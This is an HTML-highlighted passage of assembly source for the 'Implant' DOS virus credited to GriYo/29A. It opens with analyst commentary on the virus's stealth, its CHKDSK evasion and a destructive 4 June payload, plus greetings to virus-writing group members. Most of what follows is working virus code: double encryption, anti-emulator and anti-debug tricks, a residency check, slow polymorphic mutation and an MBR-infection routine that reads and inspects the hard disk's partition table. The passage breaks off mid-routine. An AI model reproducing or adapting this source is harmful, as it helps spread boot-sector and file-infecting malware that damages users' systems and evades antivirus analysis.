</span><span class="sc1">; error messagres from the CHKDSK utility.  When run on a</span><span class="sc0">
</span><span class="sc1">; system infected with a stealth virus.  CHKDSK reports</span><span class="sc0">
</span><span class="sc1">; allocation errors, because reported file sizes do not match</span><span class="sc0">
</span><span class="sc1">; their actual sizes (i.e. the reported size in bytes does not</span><span class="sc0">
</span><span class="sc1">; match the number of clusters in the file allocation table).</span><span class="sc0">
</span><span class="sc1">; Implant recognizes that CHKDSK.EXE (or a similar utility)</span><span class="sc0">
</span><span class="sc1">; is being run, and turns off its stealth routine whilst the disk</span><span class="sc0">
</span><span class="sc1">; check is performed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If there is any doubt as to whether or not a PC is infected by</span><span class="sc0">
</span><span class="sc1">; Implant, the easiest way to check is to create a file called</span><span class="sc0">
</span><span class="sc1">; CHKLIST.  If there are problems accessing this file, the virus</span><span class="sc0">
</span><span class="sc1">; is almost certainly resident.  To check if a particular execut-</span><span class="sc0">
</span><span class="sc1">; able is infected, it is probably easiest to pack the file into an</span><span class="sc0">
</span><span class="sc1">; archive and check whether the size inside is the same as</span><span class="sc0">
</span><span class="sc1">; outside. If not, the file is infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Payload</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Implant's payload triggers on 4 June. after any program asks</span><span class="sc0">
</span><span class="sc1">; for the system date.  The payload is buggy: it was apparently</span><span class="sc0">
</span><span class="sc1">; supposed to destroy the contents of track 0, rendering the</span><span class="sc0">
</span><span class="sc1">; system unusable, but the virus itself rejects the attempt to</span><span class="sc0">
</span><span class="sc1">; overwrite the infected MBR ! So, the destructive part of the</span><span class="sc0">
</span><span class="sc1">; payload does not work.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After this unsuccessful attempt to zap itself, the virus slowly,</span><span class="sc0">
</span><span class="sc1">; types the following text in the middle of the screen (green</span><span class="sc0">
</span><span class="sc1">; letters on a black background, accompanied by a rattling,</span><span class="sc0">
</span><span class="sc1">; perhaps meant to resemble the noise of a typewriters):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      &lt;&lt;&lt; SuckSexee Automated Intruder &gt;&gt;&gt;</span><span class="sc0">
</span><span class="sc1">;      Viral Implant Bio-Coded by GriYo/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the PC freezes.  After a reboot (until you chance the</span><span class="sc0">
</span><span class="sc1">; CMOS clock setting) the payload will eventually trigger</span><span class="sc0">
</span><span class="sc1">; agrain because some program, sooner or later, will try to get</span><span class="sc0">
</span><span class="sc1">; the system date - and the cycle will begin again...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Summary</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Implant impressed me.  It is definitely written by a talented</span><span class="sc0">
</span><span class="sc1">; person - it is a pity, his skills are used so destructively. I</span><span class="sc0">
</span><span class="sc1">; recently received another interesting virus (Gollum.7167)</span><span class="sc0">
</span><span class="sc1">; from the same author (carrying the signature 'GriYo/29A'):</span><span class="sc0">
</span><span class="sc1">; it spreads via infected standard DOS EXE files which drop a</span><span class="sc0">
</span><span class="sc1">; VxD in Windows'SYSTEM directory (called GOLLUM.386)</span><span class="sc0">
</span><span class="sc1">; and registers it in SYSTEM.INI. When Windows is started,</span><span class="sc0">
</span><span class="sc1">; the VxD becomes active and will infect DOS EXE files run</span><span class="sc0">
</span><span class="sc1">; in the DOS box.  This virus again shows that GriYo uses</span><span class="sc0">
</span><span class="sc1">; approaches that are neither common nor trivial.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I wonder if this is talent comparable to the Dark Avenger or</span><span class="sc0">
</span><span class="sc1">; the author of One Half?  I sincerely hope such a gifted</span><span class="sc0">
</span><span class="sc1">; person will find better thing to do than write viruses.</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And finally...</span><span class="sc0">
</span><span class="sc1">;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       Greetings go to the following generation:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       AúGuS &amp; Company ............ SuckSexee people rulez</span><span class="sc0">
</span><span class="sc1">;       Absolute Overlord .......... PolyMorphic OpCode GENerator</span><span class="sc0">
</span><span class="sc1">;       Mister Sandman ............. Mississippi ruleeez, hahaha!</span><span class="sc0">
</span><span class="sc1">;       All the 29Aers ............. 29A 3LiT3 ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And all the replicants usually at #virus</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Let's have some fun!                                                      ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

                </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">launcher</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">launcher</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">launcher</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">launcher</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">launcher</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Equates, equates, equates...                                              ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

                </span><span class="sc1">;Virus size in infections</span><span class="sc0">
</span><span class="sc5">inf_byte_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_data_buffer</span><span class="sc4">-</span><span class="sc5">virus_entry</span><span class="sc0">                    

                </span><span class="sc1">;Virus infection size in parragraphs</span><span class="sc0">
</span><span class="sc5">inf_para_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">inf_byte_size</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">)/</span><span class="sc2">0010h</span><span class="sc0">

                </span><span class="sc1">;Virus infection size in sectors</span><span class="sc0">
</span><span class="sc5">inf_sect_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">inf_byte_size</span><span class="sc4">+</span><span class="sc2">01FFh</span><span class="sc4">)/</span><span class="sc2">0200h</span><span class="sc0">

                </span><span class="sc1">;Virus size in memory</span><span class="sc0">
</span><span class="sc5">mem_byte_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_end_buffer</span><span class="sc4">-</span><span class="sc5">virus_entry</span><span class="sc0">                    

                </span><span class="sc1">;Virus size in memory in Kb</span><span class="sc0">
</span><span class="sc5">mem_kb_size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_byte_size</span><span class="sc4">+</span><span class="sc2">03FFh</span><span class="sc4">)/</span><span class="sc2">0400h</span><span class="sc0">

                </span><span class="sc1">;Virus size in memory in parragraphs</span><span class="sc0">
</span><span class="sc5">mem_para_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_byte_size</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">)/</span><span class="sc2">0010h</span><span class="sc0">

                </span><span class="sc1">;Decryptor size in bytes</span><span class="sc0">
</span><span class="sc5">decryptor</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_body</span><span class="sc4">-</span><span class="sc5">virus_entry</span><span class="sc0">

                </span><span class="sc1">;Second decryptor size in bytes</span><span class="sc0">
</span><span class="sc5">second_size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">second_body</span><span class="sc4">-</span><span class="sc5">virus_entry</span><span class="sc0">

                </span><span class="sc1">;Boot code size in bytes</span><span class="sc0">
</span><span class="sc5">boot_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">boot_end</span><span class="sc4">-</span><span class="sc5">boot_code</span><span class="sc0">

                </span><span class="sc1">;File header size</span><span class="sc0">
</span><span class="sc5">file_header_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus entry-point for all its targets                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">virus_entry</span><span class="sc4">:</span><span class="sc0">    
                </span><span class="sc1">;Space for decryptor or random data block</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_body</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Get delta offset stored on infection ( mov bp,xxxx )</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">
</span><span class="sc5">file_delta</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Save segment registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Save bx ( pointer to parameter block when calling .sys )</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Setup segment regs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">avoid_decryptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Avoid second decryptor on first virus generation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">second_body</span><span class="sc0">

                </span><span class="sc1">;Perform second decryption loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc4">-</span><span class="sc5">second_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc1">;Get pointer to decryption zone and return address</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">second_body</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Save return address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Load pointers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get decryption key</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">clave_crypt</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">second_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Decrypt one byte</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">

                </span><span class="sc1">;Do shit with stack (will fool some emulators)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">second_loop</span><span class="sc0">

                </span><span class="sc1">;Store decrypted byte</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Call to int 03h for anti debug</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc1">;Modify key</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">

                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">second_loop</span><span class="sc0">

                </span><span class="sc1">;Clear prefetch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
                </span><span class="sc1">;Jump to decryption zone</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Start of double-encrypted area                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">second_body</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check cpu type (SuckSexee needs 286+)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">control_back</span><span class="sc0">

                </span><span class="sc1">;Installation check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00BADh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Check if running in mbr, floppy boot sector or .sys file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_com_installation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_com</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">others_installation</span><span class="sc0">

</span><span class="sc5">exe_com_installation</span><span class="sc4">:</span><span class="sc0">        

                </span><span class="sc1">;This will advertise to the already resident virus that</span><span class="sc0">
                </span><span class="sc1">;its time to hook int 21h if isnt hooked</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">029Ah</span><span class="sc0">

</span><span class="sc5">others_installation</span><span class="sc4">:</span><span class="sc0">        

                </span><span class="sc1">;Installation check works with int 12h coz can be called</span><span class="sc0">
                </span><span class="sc1">;from mbr or from files... and also coz id like number 12h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0DEADh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_resident</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_resident</span><span class="sc0">

</span><span class="sc5">control_back</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get control back to infected target</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
                </span><span class="sc1">;Load offset of exit address into bx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">exit_address</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_launcher</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">

</span><span class="sc5">host_ret</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infect hd mbr                                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">not_resident</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Enable second decryption loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">avoid_decryptor</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">

                </span><span class="sc1">;Generate a block of random data over decryptor routine</span><span class="sc0">
                </span><span class="sc1">;(that routine havent any use at this point so we can use</span><span class="sc0">
                </span><span class="sc1">;its memory space)</span><span class="sc0">
                </span><span class="sc1">;Polymorphic engine will use this data later for its</span><span class="sc0">
                </span><span class="sc1">;slow mutation procedures</span><span class="sc0">
                </span><span class="sc1">;This is better than other slow mutation engines i saw</span><span class="sc0">
                </span><span class="sc1">;coz it produces several mutations of the virus on the</span><span class="sc0">
                </span><span class="sc1">;same machine, but not enough mutations for</span><span class="sc0">
                </span><span class="sc1">;analisys</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
</span><span class="sc5">fill_rnd_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random_number</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">fill_rnd_1</span><span class="sc0">

                </span><span class="sc1">;Reset disk controler</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc1">;Read mbr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virus_copy</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_read_mbr</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_memory</span><span class="sc0">

</span><span class="sc5">ok_read_mbr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check for mbr marker</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01FEh</span><span class="sc4">],</span><span class="sc2">0AA55h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_mbr_infection</span><span class="sc0">

                </span><span class="sc1">;Search active partition</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virus_copy</span><span class="sc4">+</span><span class="sc2">01BEh</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">search_active</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_active</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">search_active</span><span class="sc0">

</span><span class="sc5">no_mbr_infection</span><span class="sc4">:</span><span class="sc0">        

                </span><span class="sc1">;Exit if no active partition found</span><span class="sc0">
                </span><span class="sc1">;This is also the way on witch the virus marks</span><span class="sc0">
                </span><span class="sc1">;infected mbr</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_memory</span><span class="sc0">
</span><span class="sc5">found_active</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check partition type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Dos 16bit-fat?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">partition_type_ok</span><span class="sc0">

                </span><span class="sc1">;Dos 4.0+ 32Mb?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">partition_type_ok</span><span class="sc0">

                </span><span class="sc1">;Exit if virus cant handle such partition type</span><span class="sc0">
